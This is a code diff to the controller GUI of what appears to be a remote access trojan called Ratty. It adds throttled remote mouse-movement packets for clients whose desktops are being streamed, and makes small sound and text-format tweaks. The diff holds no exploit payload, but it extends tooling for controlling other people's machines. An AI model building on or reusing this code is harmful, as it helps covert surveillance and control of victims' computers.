@@ -18,6 +18,7 @@ package de.sogomn.rat.gui;
 
 import static de.sogomn.rat.util.Constants.LANGUAGE;
 
+import java.awt.event.MouseEvent;
 import java.awt.image.BufferedImage;
 import java.io.File;
 import java.net.URL;
@@ -91,6 +92,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	private long lastServerStart;
+	
+	private long lastMouseMotion;
 	
 	private static final String BUILDER_DATA_REPLACEMENT = "data";
 	private static final String BUILDER_DATA_REPLACEMENT_FORMAT = "%s:%s";
@@ -170,13 +173,19 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String RAM = LANGUAGE.getString("information.ram");
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
-	private static final String KEY_MODIFIER_TEXT_FORMAT = " [%s] ";
+	private static final String KEY_MODIFIER_TEXT_FORMAT = "   [%s]   ";
 	private static final String SEPARATOR = "/";
 	private static final long PING_INTERVAL = 5000;
 	private static final long NOTIFICATION_DELAY = 7500;
 	private static final String ARROW_CHARACTER = "\u2191";
+	private static final long MOUSE_MOTION_INTERVAL = 100;
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
+	
+	static {
+		PING.setGain(-7.5f);
+		PING.setSampleRate(35000);
+	}
 	
 	public RattyGuiController(final IRattyGuiFactory guiFactory) {
 		this.guiFactory = guiFactory;
@@ -656,6 +665,20 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.connection.addPacket(packet);
 	}
 	
+	private MouseEventPacket createMouseMovementPacket(final ServerClient client) {
+		if (System.currentTimeMillis() - lastMouseMotion < MOUSE_MOTION_INTERVAL || !client.isStreamingDesktop()) {
+			return null;
+		}
+		
+		final int x = client.displayPanel.getMouseX();
+		final int y = client.displayPanel.getMouseY();
+		final MouseEventPacket packet = new MouseEventPacket(x, y, MouseEvent.NOBUTTON, MouseEventPacket.MOVE);
+		
+		lastMouseMotion = System.currentTimeMillis();
+		
+		return packet;
+	}
+	
 	/*
 	 * ==================================================
 	 * HANDLING COMMANDS END
@@ -775,6 +798,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createRootRequestPacket(client);
 		} else if (command == IFileBrowserGui.REQUEST) {
 			packet = createFileRequestPacket(client);
+		} else if (command == IDisplayGui.MOUSE_MOVED) {
+			packet = createMouseMovementPacket(client);
 		}
 		
 		return packet;
